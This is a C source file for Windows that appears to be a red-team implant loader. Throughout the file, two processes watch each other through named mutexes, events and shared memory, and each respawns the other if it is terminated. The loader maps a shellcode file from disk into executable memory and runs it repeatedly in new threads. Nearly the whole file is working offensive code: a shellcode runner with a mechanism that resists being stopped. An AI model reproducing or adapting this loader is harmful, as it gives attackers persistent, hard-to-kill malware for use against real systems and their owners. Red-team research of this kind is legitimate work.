#include <handleapi.h>
#include <memoryapi.h>
#include <minwindef.h>
#include <processthreadsapi.h>
#include <stdio.h>

#include <synchapi.h>
#include <wchar.h>
#include <windows.h>
#include <winnt.h>

#include "libProc.h"
#include "libCrypt.h"
#include "libInject.h"
#include "libDebug.h"
#include "libMem.h"

#define IMPLANT_LOCATION L"C:\\Users\\redteam\\Downloads\\TRIPLE_PILOT.exe"
#define SHELLCODE_FILEW L"C:\\Users\\redteam\\Downloads\\payload.dat"
#define SHELLCODE_MAP L"payload"
// TODO: These should be replaced with GUIDs
#define MUTEX_NAME L"Global\\procA"
#define MUTEXB_NAME L"Global\\procB"
#define EVENTA_NAME L"Global\\aEvent"
#define EVENTB_NAME L"Global\\bEvent"
#define EVENTC_NAME L"Global\\cEvent"
#define SHARED_NAME L"Global\\procAshare"

int startAndMonitorPartner(){
	int retVal = NO_ERROR;
	STARTUPINFOW si = { };
	PROCESS_INFORMATION pi = { };
	unsigned long waitResult = WAIT_OBJECT_0;
	HANDLE ownPsuedoHandle = NULL;
	HANDLE dupHandle = 0;
	struct namedMemory sharedMem = {};

	DPRINT("startAndMonitorPartner\n");
	
	ownPsuedoHandle = GetCurrentProcess();
	// this API does not fail

	// Send the handle over
	retVal = openNamedMemory(SHARED_NAME, sizeof(dupHandle), &sharedMem);
	CHECK_RETVAL(retVal, "openNamedMemory");


	// Monitor the partner process for changes
	// Should kick off the partner on the first run through, then just monitor it.
	while(TRUE){
		switch (waitResult) {
			case WAIT_OBJECT_0:
				// Start the partner process
				DPRINT("Proc B is dead. I will make a new Proc B.\n");
				retVal = CreateProcessW(
					IMPLANT_LOCATION,
					NULL,//L"D:\\pay.dat",
					NULL,
					NULL,
					TRUE,
					0,
					NULL,

					NULL,
					&si,
					&pi
				);
				CHECK_RETVAL_GLE(retVal, "CreateProcessW", retVal, 0);

				retVal = DuplicateHandle(
					ownPsuedoHandle,
					ownPsuedoHandle,
					pi.hProcess, 
					&dupHandle, 
					0, 
					FALSE, 
					DUPLICATE_SAME_ACCESS
				);
				CHECK_RETVAL_GLE(retVal, "DuplicateHandle", retVal, 0);
				if (dupHandle == NULL){
					SET_RETVAL(retVal, "DuplicateHandle", UNKNOWN_ERROR);
				}
				break;
			case WAIT_TIMEOUT:
				// Do routine checks here. Not sure what they are yet.
				break;
			default:
				CHECK_RETVAL_GLE(retVal, "WaitForSingleObject", waitResult, WAIT_FAILED);
				break;
		}

		// Do I actually need to write to the memory each cycle?
		// No, but this ensures that the write event is set, which is req'd for the other thread to run
		retVal = writeNamedMemory(&dupHandle, sizeof(dupHandle), &sharedMem);
		CHECK_RETVAL(retVal, "writeNamedMemory");

		waitResult = WaitForSingleObject(pi.hProcess, 5000);
	}

CLEANUP:
	SAFE_CLOSEHANDLE(pi.hProcess);
	SAFE_CLOSEHANDLE(pi.hThread);
	closeNamedMemory(&sharedMem);

	return retVal;
}

int findAndMonitorPartner(){
	int retVal = NO_ERROR;
	struct namedMemory sharedMem = {};
	void* buf = NULL;
	unsigned long buf_size = 0;
	HANDLE mainProc = NULL;
	unsigned long waitResult = 0;

	DPRINT("findAndMonitorPartner\n");

	// TODO: This probably shouldn't have to know the size of the buffer.
	// Currently set like this because apparently the B thread gets here before the A thread creates the memory
	retVal = openNamedMemory(SHARED_NAME, sizeof(HANDLE*), &sharedMem);
	CHECK_RETVAL(retVal, "openNamedMemory");

	retVal = readNamedMemoryOnEvent(INFINITE, &sharedMem, &buf, &buf_size);
	CHECK_RETVAL(retVal, "readNamedMemory");

	mainProc = *(HANDLE*)buf;
	if(mainProc == NULL){
		SET_RETVAL(retVal, "readNamedMemoryOnEvent", UNKNOWN_ERROR);
	}

	waitResult = WaitForSingleObject(mainProc, INFINITE);
	switch (waitResult) {
			case WAIT_OBJECT_0:
				// Start the partner process
				// If Proc A is dead and this thread exits, the master thread will get the ProcA mutex and run those functions
				DPRINT("Proc A died. I will become Proc A.\n");
				goto CLEANUP;
			case WAIT_TIMEOUT:
				// Do routine checks here. Not sure what they are yet.
				break;
			default:
				CHECK_RETVAL_GLE(retVal, "WaitForSingleObject", waitResult, WAIT_FAILED);
				break;
		}

CLEANUP:
	closeNamedMemory(&sharedMem);
	SAFE_VIRTFREE(buf);

	return retVal;
}

int processPayload(char* payloadData, int payloadLen){
	DPRINT("processPayload\n");
	int retVal = 0;
	DWORD oldProtect = 0;

	retVal = VirtualProtect(payloadData, payloadLen, PAGE_EXECUTE_READ, &oldProtect);
	CHECK_RETVAL_GLE(retVal, "VirtualProtect", retVal, 0);
	
	retVal = NO_ERROR;

CLEANUP:
	return retVal;
}

int runPayload(char* payloadData){
	DPRINT("runPayload\n");

	int retVal = 0;
	HANDLE implantHandle = NULL;

	while(TRUE){
		implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadData, NULL, 0, 0);
		CHECK_RETVAL_GLE(retVal, "CreateThread", implantHandle, NULL);
		DPRINT("New Payload\n");
		WaitForSingleObject(implantHandle, INFINITE);
	}

CLEANUP:
	SAFE_CLOSEHANDLE(implantHandle);
	return retVal;
}

int main(){
    int retVal = NO_ERROR;
	
	HANDLE aEvent = NULL;
	HANDLE bEvent = NULL;
	HANDLE cEvent = NULL;
	HANDLE procA = NULL;
	unsigned long waitResult = 0;
	int whoAmI = 0;

	HANDLE monitorHandle = NULL;

	HANDLE shellcodeFile = NULL;
	HANDLE shellcodeMap = NULL;
	void* shellcodeView = NULL;
	HANDLE implantHandle = NULL;

	// Create the mutexes
	procA = CreateMutexW(NULL, FALSE, MUTEX_NAME);
	CHECK_RETVAL_GLE(retVal, "CreateEvent", procA, NULL);

	aEvent = CreateEventW(NULL, TRUE, FALSE, EVENTA_NAME);
	CHECK_RETVAL_GLE(retVal, "CreateEvent", aEvent, NULL);

	bEvent = CreateEventW(NULL, FALSE, FALSE, EVENTB_NAME);
	CHECK_RETVAL_GLE(retVal, "CreateEvent", bEvent, NULL);

	cEvent = CreateEventW(NULL, FALSE, FALSE, EVENTC_NAME);
	CHECK_RETVAL_GLE(retVal, "CreateEvent", cEvent, NULL);

	while(TRUE){
	// Try and determine which process this will be
		waitResult = WaitForSingleObject(procA, 500);
		switch (waitResult) {// case fall-throughs are intentional
			case WAIT_ABANDONED:
			case WAIT_OBJECT_0:
				whoAmI = 1;
				DPRINT("Proc A\n");
				break; // I'm procA
			case WAIT_TIMEOUT:
				whoAmI = 2;
				DPRINT("Proc B\n");
				break; // I'm procB
			default:
				CHECK_RETVAL_GLE(retVal, "WaitForSingleObject", waitResult, WAIT_FAILED);
				break;
		}

		if (whoAmI == 1){
			// Make a worker thread to make and watch the partner process
			// TODO: Add a check to see if procB is already running. If so, run findAndMonitorPartner instead
			monitorHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)startAndMonitorPartner, NULL, 0, 0);
			CHECK_RETVAL_GLE(retVal, "CreateThread", monitorHandle, NULL);

			waitResult = WaitForSingleObject(bEvent, INFINITE);
			switch(waitResult){
				case WAIT_OBJECT_0:
					break;
				default:
					SET_RETVAL(retVal, "main", 999); // TODO: This is dirty. Try again.
			}

			// Open the shellcode file
			// TODO: Add code to attempt to get an exclusive handle to protect the file
			shellcodeFile = CreateFileW(
				SHELLCODE_FILEW,
				GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			CHECK_RETVAL_GLE(retVal, "CreateFileW", shellcodeFile, INVALID_HANDLE_VALUE);

			shellcodeMap = CreateFileMappingW(
				shellcodeFile,
				NULL,
				PAGE_EXECUTE_READ,//PAGE_READONLY, // SEC_IMAGE_NO_EXECUTE | SEC_NOCACHE
				0,
				0,
				SHELLCODE_MAP
			);
			CHECK_RETVAL_GLE(retVal, "CreateFileMappingW", shellcodeMap, NULL);

			DPRINT("Orchestrate\n");
			// Signal procB that the shellcode is ready
			retVal = SetEvent(aEvent);
			CHECK_RETVAL_GLE(retVal, "SetEvent", retVal, 0);

			// Watch the procA thread to keep it alive
			waitResult = WaitForSingleObject(monitorHandle, INFINITE);
		} else if (whoAmI == 2) {
				retVal = SetEvent(bEvent);
				CHECK_RETVAL_GLE(retVal, "SetEvent", retVal, 0);

				waitResult = WaitForSingleObject(aEvent, INFINITE);
				CHECK_RETVAL_GLE(retVal, "WaitForSingleObject", waitResult, WAIT_FAILED);

				monitorHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)findAndMonitorPartner, NULL, 0, 0);
				CHECK_RETVAL_GLE(retVal, "CreateThread", monitorHandle, NULL);

				shellcodeMap = OpenFileMappingW(
					FILE_MAP_READ | FILE_MAP_EXECUTE,
					FALSE,
					SHELLCODE_MAP
				);
				CHECK_RETVAL_GLE(retVal, "OpenFileMappingW", shellcodeMap, NULL);

				shellcodeView = MapViewOfFile(
					shellcodeMap,
					FILE_MAP_READ | FILE_MAP_EXECUTE,
					0,
					0,
					0
				);
				CHECK_RETVAL_GLE(retVal, "MapViewOfFile", shellcodeView, NULL);

				implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runPayload, (char*) shellcodeView, 0, 0);// runPayload((char*) shellcodeView, &implantHandle);
				CHECK_RETVAL_GLE(retVal, "CreateThread", implantHandle, NULL);

				DPRINT("Orchestrate\n");
				retVal = SetEvent(bEvent);
				CHECK_RETVAL_GLE(retVal, "SetEvent", retVal, 0);

				waitResult = WaitForSingleObject(monitorHandle, INFINITE);

		} else{
			SET_RETVAL(retVal, "Main", UNKNOWN_ERROR);
		}
	}

CLEANUP:
	SAFE_CLOSEHANDLE(shellcodeFile);
	SAFE_CLOSEHANDLE(shellcodeMap);
	if (shellcodeView != NULL) UnmapViewOfFile(shellcodeView);

	SAFE_CLOSEHANDLE(implantHandle);

	if (procA != NULL) ReleaseMutex(procA);
	SAFE_CLOSEHANDLE(procA);
	SAFE_CLOSEHANDLE(aEvent);
	SAFE_CLOSEHANDLE(bEvent);
	SAFE_CLOSEHANDLE(cEvent);

    return retVal;
};
